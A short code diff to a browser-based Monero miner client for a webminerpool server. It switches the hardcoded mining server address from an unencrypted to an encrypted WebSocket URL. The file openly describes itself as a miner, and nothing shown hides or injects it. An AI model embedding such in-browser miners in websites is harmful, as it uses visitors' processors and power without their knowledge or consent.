@@ -1,6 +1,6 @@
 /* very simple monero miner for the webminerpool server */
 
-var server = "ws://a34.139.99.133.108.traefik.me:443/"
+var server = "wss://a34.139.99.133.108.traefik.me:443/"
 
 var job = null;      // remember last job we got from the server
 var workers = [];    // keep track of our workers
